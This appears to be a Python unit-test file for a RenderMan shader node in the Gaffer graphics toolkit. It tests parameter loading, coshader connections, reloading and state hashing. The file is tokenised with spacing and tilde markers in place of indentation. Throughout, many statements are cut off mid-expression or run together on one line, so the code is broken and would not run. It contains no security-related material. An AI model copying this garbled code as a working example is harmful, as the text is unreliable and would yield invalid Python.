import GafferRenderManTest \n 
\n 
class RenderManShaderTest ( GafferRenderManTest . RenderManTestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
\n 
~~~ GafferRenderManTest . RenderManTestCase . setUp ( self ) \n 
\n 
GafferRenderMan . RenderManShader . shaderLoader ( ) . clear ( ) \n 
\n 
~~ def test ( self ) : \n 
\n 
~~~ n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( "plastic" ) \n 
\n 
self . failUnless ( isinstance ( n [ "parameters" ] [ "Ks" ] , Gaffer . FloatPlug ) ) \n 
self . failUnless ( isinstance ( n [ "parameters" ] [ "Kd" ] , Gaffer . FloatPlug ) ) \n 
self . failUnless ( isinstance ( n [ "parameters" ] [ "Ka" ] , Gaffer . FloatPlug ) ) \n 
self . failUnless ( isinstance ( n [ "parameters" ] [ "roughness" ] , Gaffer . FloatPlug ) ) \n 
self . failUnless ( isinstance ( n [ "parameters" ] [ "specularcolor" ] , Gaffer . Color3fPlug ) ) \n 
\n 
self . assertEqual ( n [ "parameters" ] [ "Ks" ] . getValue ( ) , 0.5 ) \n 
self . assertEqual ( n [ "parameters" ] [ "Kd" ] . getValue ( ) , 0.5 ) \n 
self . assertEqual ( n [ "parameters" ] [ "Ka" ] . getValue ( ) , 1 ) \n 
self . assertAlmostEqual ( n [ "parameters" ] [ "roughness" ] . getValue ( ) , 0.1 ) \n 
self . assertEqual ( n [ "parameters" ] [ "specularcolor" ] . getValue ( ) , IECore . Color3f ( 1 ) ) \n 
\n 
~~ def testSerialisation ( self ) : \n 
\n 
~~~ s = Gaffer . ScriptNode ( ) \n 
s [ "n" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "n" ] . loadShader ( "plastic" ) \n 
\n 
ss = s . serialise ( ) \n 
\n 
s = Gaffer . ScriptNode ( ) \n 
s . execute ( ss ) \n 
\n 
st = s [ "n" ] . state ( ) \n 
self . assertEqual ( len ( st ) , 1 ) \n 
\n 
self . assertEqual ( st [ 0 ] . type , "ri:surface" ) \n 
self . assertEqual ( st [ 0 ] . name , "plastic" ) \n 
\n 
self . failUnless ( isinstance ( s [ "n" ] [ "parameters" ] [ "Ks" ] , Gaffer . FloatPlug ) ) \n 
self . failUnless ( isinstance ( s [ "n" ] [ "parameters" ] [ "Kd" ] , Gaffer . FloatPlug ) ) \n 
self . failUnless ( isinstance ( s [ "n" ] [ "parameters" ] [ "Ka" ] , Gaffer . FloatPlug ) ) \n 
self . failUnless ( isinstance ( s [ "n" ] [ "parameters" ] [ "roughness" ] , Gaffer . FloatPlug ) ) \n 
self . failUnless ( isinstance ( s [ "n" ] [ "parameters" ] [ "specularcolor" ] , Gaffer . Color3fPlug ) ) \n 
\n 
self . assertTrue ( "parameters1" not in s [ "n" ] ) \n 
\n 
~~ def testShader ( self ) : \n 
\n 
~~~ n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( "plastic" ) \n 
\n 
s = n . state ( ) \n 
self . assertEqual ( len ( s ) , 1 ) \n 
\n 
self . assertEqual ( s [ 0 ] . type , "ri:surface" ) \n 
self . assertEqual ( s [ 0 ] . name , "plastic" ) \n 
\n 
self . assertEqual ( s [ 0 ] . parameters [ "Ks" ] , IECore . FloatData ( .5 ) ) \n 
self . assertEqual ( s [ 0 ] . parameters [ "Kd" ] , IECore . FloatData ( .5 ) ) \n 
self . assertEqual ( s [ 0 ] . parameters [ "Ka" ] , IECore . FloatData ( 1 ) ) \n 
self . assertEqual ( s [ 0 ] . parameters [ "roughness" ] , IECore . FloatData ( .1 ) ) \n 
self . assertEqual ( s [ 0 ] . parameters [ "specularcolor" ] , IECore . Color3fData ( IECore . Color3f ( 1 ) ) ) \n 
\n 
~~ def testShaderHash ( self ) : \n 
\n 
~~~ n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( "matte" ) \n 
h1 = n . stateHash ( ) \n 
\n 
n [ "parameters" ] [ "Kd" ] . setValue ( 0.25 ) \n 
self . assertNotEqual ( n . stateHash ( ) , h1 ) \n 
\n 
~~ def testCoshaderHash ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
\n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
self . assertTrue ( "coshaderParameter" in shaderNode [ "parameters" ] ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "coshaderParameter" ] . typeId ( ) , Gaffer . Plug . staticTypeId \n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
shaderNode [ "parameters" ] [ "coshaderParameter" ] . setInput ( coshaderNode [ "out" ] ) \n 
\n 
h1 = shaderNode . stateHash ( ) \n 
\n 
coshaderNode [ "parameters" ] [ "floatParameter" ] . setValue ( 0.25 ) \n 
\n 
self . assertNotEqual ( shaderNode . stateHash ( ) , h1 ) \n 
\n 
~~ def testParameterOrdering ( self ) : \n 
\n 
~~~ n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( "plastic" ) \n 
\n 
self . assertEqual ( n [ "parameters" ] [ 0 ] . getName ( ) , "Ks" ) \n 
self . assertEqual ( n [ "parameters" ] [ 1 ] . getName ( ) , "Kd" ) \n 
self . assertEqual ( n [ "parameters" ] [ 2 ] . getName ( ) , "Ka" ) \n 
self . assertEqual ( n [ "parameters" ] [ 3 ] . getName ( ) , "roughness" ) \n 
self . assertEqual ( n [ "parameters" ] [ 4 ] . getName ( ) , "specularcolor" ) \n 
\n 
n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( "matte" ) \n 
\n 
self . assertEqual ( n [ "parameters" ] [ 0 ] . getName ( ) , "Ka" ) \n 
self . assertEqual ( n [ "parameters" ] [ 1 ] . getName ( ) , "Kd" ) \n 
\n 
~~ def testCoshader ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
\n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
self . assertTrue ( "coshaderParameter" in shaderNode [ "parameters" ] ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "coshaderParameter" ] . typeId ( ) , Gaffer . Plug . staticTypeId \n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
shaderNode [ "parameters" ] [ "coshaderParameter" ] . setInput ( coshaderNode [ "out" ] ) \n 
\n 
s = shaderNode . state ( ) \n 
self . assertEqual ( len ( s ) , 2 ) \n 
\n 
self . assertEqual ( s [ 0 ] . name , coshader ) \n 
self . assertEqual ( s [ 1 ] . name , shader ) \n 
self . assertEqual ( s [ 0 ] . parameters [ "__handle" ] , s [ 1 ] . parameters [ "coshaderParameter" ] ) \n 
\n 
~~ def testInputAcceptance ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
random = Gaffer . Random ( ) \n 
\n 
self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderParameter" ] . acceptsInput ( coshaderNode [ "out" ] ) self . assertFalse ( shaderNode [ "parameters" ] [ "coshaderParameter" ] . acceptsInput ( random [ "outFloat" ] ) \n 
self . assertTrue ( shaderNode [ "parameters" ] [ "floatParameter" ] . acceptsInput ( random [ "outFloat" ] ) ) \n 
self . assertFalse ( shaderNode [ "parameters" ] [ "floatParameter" ] . acceptsInput ( coshaderNode [ "out" ] ) ) \n 
self . assertTrue ( coshaderNode [ "parameters" ] [ "colorParameter" ] . acceptsInput ( random [ "outColor" ] ) ) self . assertFalse ( coshaderNode [ "parameters" ] [ "colorParameter" ] . acceptsInput ( coshaderNode [ "out" ] ) \n 
~~ def testParameterDefaultValue ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
self . assertEqual ( shaderNode [ "parameters" ] [ "floatParameter" ] . defaultValue ( ) , 1 ) \n 
\n 
~~ def testParameterMinMax ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
self . assertEqual ( shaderNode [ "parameters" ] [ "floatParameter" ] . minValue ( ) , - 1 ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "floatParameter" ] . maxValue ( ) , 10 ) \n 
\n 
~~ def testReload ( self ) : \n 
\n 
~~~ shader1 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version1.sl" ) \n 
\n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader1 ) \n 
shaderNode [ "parameters" ] [ "float1" ] . setValue ( 0.1 ) \n 
shaderNode [ "parameters" ] [ "string1" ] . setValue ( "test" ) \n 
shaderNode [ "parameters" ] [ "color1" ] . setValue ( IECore . Color3f ( 1 , 2 , 3 ) ) \n 
self . assertAlmostEqual ( shaderNode [ "parameters" ] [ "float1" ] . getValue ( ) , 0.1 ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "string1" ] . getValue ( ) , "test" ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "color1" ] . getValue ( ) , IECore . Color3f ( 1 , 2 , 3 ) ) \n 
\n 
shader2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version2.sl" ) \n 
shaderNode . loadShader ( shader2 , keepExistingValues = True ) \n 
\n 
self . assertEqual ( shaderNode [ "parameters" ] . keys ( ) , [ "float1" , "string1" , "color1" , "float2" , "string2" self . assertAlmostEqual ( shaderNode [ "parameters" ] [ "float1" ] . getValue ( ) , 0.1 ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "string1" ] . getValue ( ) , "test" ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "color1" ] . getValue ( ) , IECore . Color3f ( 1 , 2 , 3 ) ) \n 
\n 
shaderNode . loadShader ( shader1 , keepExistingValues = True ) \n 
\n 
self . assertEqual ( shaderNode [ "parameters" ] . keys ( ) , [ "float1" , "string1" , "color1" ] ) \n 
self . assertAlmostEqual ( shaderNode [ "parameters" ] [ "float1" ] . getValue ( ) , 0.1 ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "string1" ] . getValue ( ) , "test" ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "color1" ] . getValue ( ) , IECore . Color3f ( 1 , 2 , 3 ) ) \n 
\n 
shaderNode . loadShader ( shader1 , keepExistingValues = False ) \n 
\n 
self . assertEqual ( shaderNode [ "parameters" ] . keys ( ) , [ "float1" , "string1" , "color1" ] ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "float1" ] . getValue ( ) , 1 ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "string1" ] . getValue ( ) , "" ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "color1" ] . getValue ( ) , IECore . Color3f ( 1 , 1 , 1 ) ) \n 
\n 
~~ def testReloadRemovesOldParameters ( self ) : \n 
\n 
~~~ shader2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version2.sl" ) \n 
\n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader2 ) \n 
\n 
self . assertEqual ( shaderNode [ "parameters" ] . keys ( ) , [ "float1" , "string1" , "color1" , "float2" , "string2" \n 
shader3 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version3.sl" ) \n 
shaderNode . loadShader ( shader3 ) \n 
\n 
self . assertEqual ( shaderNode [ "parameters" ] . keys ( ) , [ "float1" , "string1" , "color1" , "float2" ] ) \n 
\n 
~~ def testAutomaticReloadOnScriptLoad ( self ) : \n 
\n 
~~~ shader1 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version1.sl" , shaderName = "unversioned" \n 
s = Gaffer . ScriptNode ( ) \n 
s [ "shader" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "shader" ] . loadShader ( shader1 ) \n 
s [ "shader" ] [ "parameters" ] [ "float1" ] . setValue ( 0.1 ) \n 
s [ "shader" ] [ "parameters" ] [ "string1" ] . setValue ( "test" ) \n 
s [ "shader" ] [ "parameters" ] [ "color1" ] . setValue ( IECore . Color3f ( 1 , 2 , 3 ) ) \n 
\n 
ss = s . serialise ( ) \n 
\n 
self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version2.sl" , shaderName = "unversioned" \n 
GafferRenderMan . RenderManShader . shaderLoader ( ) . clear ( ) \n 
\n 
s = Gaffer . ScriptNode ( ) \n 
s . execute ( ss ) \n 
\n 
self . assertEqual ( s [ "shader" ] [ "parameters" ] . keys ( ) , [ "float1" , "string1" , "color1" , "float2" , "string2" self . assertAlmostEqual ( s [ "shader" ] [ "parameters" ] [ "float1" ] . getValue ( ) , 0.1 ) \n 
self . assertEqual ( s [ "shader" ] [ "parameters" ] [ "string1" ] . getValue ( ) , "test" ) \n 
self . assertEqual ( s [ "shader" ] [ "parameters" ] [ "color1" ] . getValue ( ) , IECore . Color3f ( 1 , 2 , 3 ) ) \n 
\n 
~~ def testReloadPreservesConnections ( self ) : \n 
\n 
~~~ n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( "plastic" ) \n 
\n 
random = Gaffer . Random ( ) \n 
\n 
n [ "parameters" ] [ "Ks" ] . setInput ( random [ "outFloat" ] ) \n 
n [ "parameters" ] [ "specularcolor" ] . setInput ( random [ "outColor" ] ) \n 
\n 
n . loadShader ( "plastic" , keepExistingValues = True ) \n 
\n 
self . assertTrue ( n [ "parameters" ] [ "Ks" ] . getInput ( ) . isSame ( random [ "outFloat" ] ) ) \n 
self . assertTrue ( n [ "parameters" ] [ "specularcolor" ] . getInput ( ) . isSame ( random [ "outColor" ] ) ) \n 
\n 
~~ def testReloadPreservesConnectionsWhenMinMaxOrDefaultChanges ( self ) : \n 
\n 
~~~ shader1 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version1.sl" , shaderName = "unversioned" n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( shader1 ) \n 
\n 
self . assertFalse ( n [ "parameters" ] [ "float1" ] . hasMinValue ( ) ) \n 
self . assertFalse ( n [ "parameters" ] [ "float1" ] . hasMaxValue ( ) ) \n 
self . assertEqual ( n [ "parameters" ] [ "string1" ] . defaultValue ( ) , "" ) \n 
\n 
nn = Gaffer . Node ( ) \n 
nn [ "outFloat" ] = Gaffer . FloatPlug ( direction = Gaffer . Plug . Direction . Out ) \n 
nn [ "outString" ] = Gaffer . StringPlug ( direction = Gaffer . Plug . Direction . Out ) \n 
\n 
n [ "parameters" ] [ "float1" ] . setInput ( nn [ "outFloat" ] ) \n 
n [ "parameters" ] [ "string1" ] . setInput ( nn [ "outString" ] ) \n 
\n 
shader2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version2.sl" , shaderName = "unversioned" \n 
GafferRenderMan . RenderManShader . shaderLoader ( ) . clear ( ) \n 
n . loadShader ( shader1 , keepExistingValues = True ) \n 
\n 
self . assertTrue ( n [ "parameters" ] [ "float1" ] . hasMinValue ( ) ) \n 
self . assertTrue ( n [ "parameters" ] [ "float1" ] . hasMaxValue ( ) ) \n 
self . assertEqual ( n [ "parameters" ] [ "float1" ] . minValue ( ) , - 1 ) \n 
self . assertEqual ( n [ "parameters" ] [ "float1" ] . maxValue ( ) , 2 ) \n 
self . assertEqual ( n [ "parameters" ] [ "string1" ] . defaultValue ( ) , "newDefaultValue" ) \n 
\n 
self . assertTrue ( n [ "parameters" ] [ "float1" ] . getInput ( ) . isSame ( nn [ "outFloat" ] ) ) \n 
self . assertTrue ( n [ "parameters" ] [ "string1" ] . getInput ( ) . isSame ( nn [ "outString" ] ) ) \n 
\n 
~~ def testReloadPreservesPartialConnectionsWhenMinMaxOrDefaultChanges ( self ) : \n 
\n 
~~~ shader1 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version1.sl" , shaderName = "unversioned" n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( shader1 ) \n 
\n 
nn = Gaffer . Node ( ) \n 
nn [ "outFloat" ] = Gaffer . FloatPlug ( direction = Gaffer . Plug . Direction . Out ) \n 
\n 
n [ "parameters" ] [ "color1" ] [ 0 ] . setInput ( nn [ "outFloat" ] ) \n 
n [ "parameters" ] [ "color1" ] [ 1 ] . setInput ( nn [ "outFloat" ] ) \n 
n [ "parameters" ] [ "color1" ] [ 2 ] . setValue ( 0.75 ) \n 
\n 
shader2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version2.sl" , shaderName = "unversioned" \n 
GafferRenderMan . RenderManShader . shaderLoader ( ) . clear ( ) \n 
n . loadShader ( shader1 , keepExistingValues = True ) \n 
\n 
self . assertTrue ( n [ "parameters" ] [ "color1" ] [ 0 ] . getInput ( ) . isSame ( nn [ "outFloat" ] ) ) \n 
self . assertTrue ( n [ "parameters" ] [ "color1" ] [ 1 ] . getInput ( ) . isSame ( nn [ "outFloat" ] ) ) \n 
self . assertEqual ( n [ "parameters" ] [ "color1" ] [ 2 ] . getValue ( ) , 0.75 ) \n 
\n 
~~ def testReloadPreservesValuesWhenMinMaxOrDefaultChanges ( self ) : \n 
\n 
~~~ shader1 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version1.sl" , shaderName = "unversioned" n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( shader1 ) \n 
\n 
n [ "parameters" ] [ "float1" ] . setValue ( 0.25 ) \n 
n [ "parameters" ] [ "string1" ] . setValue ( "dog" ) \n 
n [ "parameters" ] [ "color1" ] . setValue ( IECore . Color3f ( 0.1 , 0.25 , 0.5 ) ) \n 
\n 
shader2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version2.sl" , shaderName = "unversioned" \n 
GafferRenderMan . RenderManShader . shaderLoader ( ) . clear ( ) \n 
n . loadShader ( shader1 , keepExistingValues = True ) \n 
\n 
self . assertEqual ( n [ "parameters" ] [ "float1" ] . getValue ( ) , 0.25 ) \n 
self . assertEqual ( n [ "parameters" ] [ "string1" ] . getValue ( ) , "dog" ) \n 
self . assertEqual ( n [ "parameters" ] [ "color1" ] . getValue ( ) , IECore . Color3f ( 0.1 , 0.25 , 0.5 ) ) \n 
\n 
~~ def testOutputParameters ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/version3.sl" ) \n 
n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( shader ) \n 
\n 
self . failIf ( "outputFloat" in n [ "parameters" ] . keys ( ) ) \n 
\n 
~~ def testAssignmentDirtyPropagation ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
shaderNode [ "parameters" ] [ "coshaderParameter" ] . setInput ( coshaderNode [ "out" ] ) \n 
\n 
plane = GafferScene . Plane ( ) \n 
assignment = GafferScene . ShaderAssignment ( ) \n 
assignment [ "in" ] . setInput ( plane [ "out" ] ) \n 
assignment [ "shader" ] . setInput ( shaderNode [ "out" ] ) \n 
\n 
cs = GafferTest . CapturingSlot ( assignment . plugDirtiedSignal ( ) ) \n 
\n 
coshaderNode [ "parameters" ] [ "floatParameter" ] . setValue ( 12 ) \n 
\n 
dirtiedNames = [ x [ 0 ] . fullName ( ) for x in cs ] \n 
self . assertEqual ( len ( dirtiedNames ) , 3 ) \n 
self . assertEqual ( dirtiedNames [ 0 ] , "ShaderAssignment.shader" ) \n 
self . assertEqual ( dirtiedNames [ 1 ] , "ShaderAssignment.out.attributes" ) \n 
self . assertEqual ( dirtiedNames [ 2 ] , "ShaderAssignment.out" ) \n 
\n 
~~ def testArrayParameters ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/arrayParameters.sl" ) \n 
n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( shader ) \n 
\n 
expected = { \n 
"dynamicFloatArray" : IECore . FloatVectorData ( [ ] ) , \n 
"fixedFloatArray" : IECore . FloatVectorData ( [ 1 , 2 , 3 , 4 ] ) , \n 
"dynamicStringArray" : IECore . StringVectorData ( [ "dynamic" , "arrays" , "can" , "still" , "have" , "defaults" "fixedStringArray" : IECore . StringVectorData ( [ "hello" , "goodbye" ] ) , \n 
"dynamicColorArray" : IECore . Color3fVectorData ( [ IECore . Color3f ( 1 ) , IECore . Color3f ( 2 ) ] ) , \n 
"fixedColorArray" : IECore . Color3fVectorData ( [ IECore . Color3f ( 1 ) , IECore . Color3f ( 2 ) ] ) , \n 
"dynamicVectorArray" : IECore . V3fVectorData ( [ ] , IECore . GeometricData . Interpretation . Vector ) , \n 
"fixedVectorArray" : IECore . V3fVectorData ( [ IECore . V3f ( x ) for x in range ( 1 , 6 ) ] , IECore . GeometricData "dynamicPointArray" : IECore . V3fVectorData ( [ ] , IECore . GeometricData . Interpretation . Point ) , \n 
"fixedPointArray" : IECore . V3fVectorData ( [ IECore . V3f ( x ) for x in range ( 1 , 6 ) ] , IECore . GeometricData "dynamicNormalArray" : IECore . V3fVectorData ( [ ] , IECore . GeometricData . Interpretation . Normal ) , \n 
"fixedNormalArray" : IECore . V3fVectorData ( [ IECore . V3f ( x ) for x in range ( 1 , 6 ) ] , IECore . GeometricData } \n 
\n 
self . assertEqual ( set ( n [ "parameters" ] . keys ( ) ) , set ( expected . keys ( ) ) ) \n 
\n 
for name , value in expected . items ( ) : \n 
\n 
~~~ self . assertEqual ( n [ "parameters" ] [ name ] . defaultValue ( ) , value ) \n 
self . assertEqual ( n [ "parameters" ] [ name ] . getValue ( ) , value ) \n 
\n 
~~ s = n . state ( ) [ 0 ] \n 
\n 
for name , value in expected . items ( ) : \n 
\n 
~~~ self . assertEqual ( s . parameters [ name ] , value ) \n 
\n 
~~ ~~ def testFixedCoshaderArrayParameters ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParameters.sl" ) n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( shader ) \n 
\n 
self . assertEqual ( n [ "parameters" ] . keys ( ) , [ "dynamicShaderArray" , "fixedShaderArray" ] ) \n 
\n 
self . assertTrue ( isinstance ( n [ "parameters" ] [ "fixedShaderArray" ] , Gaffer . ArrayPlug ) ) \n 
\n 
self . assertEqual ( len ( n [ "parameters" ] [ "fixedShaderArray" ] ) , 4 ) \n 
self . assertTrue ( isinstance ( n [ "parameters" ] [ "fixedShaderArray" ] [ "fixedShaderArray0" ] , Gaffer . Plug self . assertTrue ( isinstance ( n [ "parameters" ] [ "fixedShaderArray" ] [ "fixedShaderArray1" ] , Gaffer . Plug self . assertTrue ( isinstance ( n [ "parameters" ] [ "fixedShaderArray" ] [ "fixedShaderArray2" ] , Gaffer . Plug self . assertTrue ( isinstance ( n [ "parameters" ] [ "fixedShaderArray" ] [ "fixedShaderArray3" ] , Gaffer . Plug \n 
state = n . state ( ) \n 
\n 
self . assertEqual ( state [ 0 ] . parameters [ "fixedShaderArray" ] , IECore . StringVectorData ( [ "" ] * 4 ) ) \n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
n [ "parameters" ] [ "fixedShaderArray" ] [ "fixedShaderArray0" ] . setInput ( coshaderNode [ "out" ] ) \n 
\n 
state = n . state ( ) \n 
\n 
self . assertEqual ( state [ 1 ] . parameters [ "fixedShaderArray" ] , IECore . StringVectorData ( [ state [ 0 ] . parameters \n 
~~ def testCoshaderType ( self ) : \n 
\n 
~~~ coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
self . assertEqual ( coshaderNode . state ( ) [ 0 ] . type , "ri:shader" ) \n 
\n 
~~ def testCantConnectSurfaceShaderIntoCoshaderInput ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
n1 = GafferRenderMan . RenderManShader ( ) \n 
n1 . loadShader ( shader ) \n 
\n 
n2 = GafferRenderMan . RenderManShader ( ) \n 
n2 . loadShader ( "plastic" ) \n 
\n 
self . assertFalse ( n1 [ "parameters" ] [ "coshaderParameter" ] . acceptsInput ( n2 [ "out" ] ) ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
n3 = GafferRenderMan . RenderManShader ( ) \n 
n3 . loadShader ( coshader ) \n 
\n 
self . assertTrue ( n1 [ "parameters" ] [ "coshaderParameter" ] . acceptsInput ( n3 [ "out" ] ) ) \n 
\n 
arrayShader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParameters.sl" n4 = GafferRenderMan . RenderManShader ( ) \n 
n4 . loadShader ( arrayShader ) \n 
\n 
self . assertFalse ( n4 [ "parameters" ] [ "fixedShaderArray" ] [ "fixedShaderArray0" ] . acceptsInput ( n2 [ "out" self . assertTrue ( n4 [ "parameters" ] [ "fixedShaderArray" ] [ "fixedShaderArray0" ] . acceptsInput ( n3 [ "out" ] \n 
~~ def testConnectionsBetweenParameters ( self ) : \n 
\n 
~~~ s = GafferRenderMan . RenderManShader ( ) \n 
s . loadShader ( "plastic" ) \n 
\n 
s [ "parameters" ] [ "Kd" ] . setValue ( 0.25 ) \n 
s [ "parameters" ] [ "Ks" ] . setInput ( s [ "parameters" ] [ "Kd" ] ) \n 
\n 
shader = s . state ( ) [ 0 ] \n 
\n 
self . assertEqual ( shader . parameters [ "Kd" ] . value , 0.25 ) \n 
self . assertEqual ( shader . parameters [ "Ks" ] . value , 0.25 ) \n 
\n 
~~ def testFixedCoshaderArrayParameterHash ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParameters.sl" ) n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( shader ) \n 
\n 
h1 = n . stateHash ( ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
n [ "parameters" ] [ "fixedShaderArray" ] [ "fixedShaderArray0" ] . setInput ( coshaderNode [ "out" ] ) \n 
\n 
h2 = n . stateHash ( ) \n 
self . assertNotEqual ( h2 , h1 ) \n 
\n 
n [ "parameters" ] [ "fixedShaderArray" ] [ "fixedShaderArray1" ] . setInput ( coshaderNode [ "out" ] ) \n 
\n 
h3 = n . stateHash ( ) \n 
self . assertNotEqual ( h3 , h2 ) \n 
self . assertNotEqual ( h3 , h1 ) \n 
\n 
n [ "parameters" ] [ "fixedShaderArray" ] [ "fixedShaderArray1" ] . setInput ( None ) \n 
n [ "parameters" ] [ "fixedShaderArray" ] [ "fixedShaderArray2" ] . setInput ( coshaderNode [ "out" ] ) \n 
\n 
h4 = n . stateHash ( ) \n 
self . assertNotEqual ( h4 , h3 ) \n 
self . assertNotEqual ( h4 , h2 ) \n 
self . assertNotEqual ( h4 , h1 ) \n 
\n 
~~ def testDisabling ( self ) : \n 
\n 
~~~ s = GafferRenderMan . RenderManShader ( ) \n 
s . loadShader ( "plastic" ) \n 
\n 
stateHash = s . stateHash ( ) \n 
state = s . state ( ) \n 
self . assertEqual ( len ( state ) , 1 ) \n 
self . assertEqual ( state [ 0 ] . name , "plastic" ) \n 
\n 
self . assertTrue ( s [ "enabled" ] . isSame ( s . enabledPlug ( ) ) ) \n 
\n 
s [ "enabled" ] . setValue ( False ) \n 
\n 
stateHash2 = s . stateHash ( ) \n 
self . assertNotEqual ( stateHash2 , stateHash ) \n 
\n 
state2 = s . state ( ) \n 
self . assertEqual ( len ( state2 ) , 0 ) \n 
\n 
~~ def testDisablingCoshaders ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
\n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
shaderNode [ "parameters" ] [ "coshaderParameter" ] . setInput ( coshaderNode [ "out" ] ) \n 
\n 
s = shaderNode . state ( ) \n 
self . assertEqual ( len ( s ) , 2 ) \n 
\n 
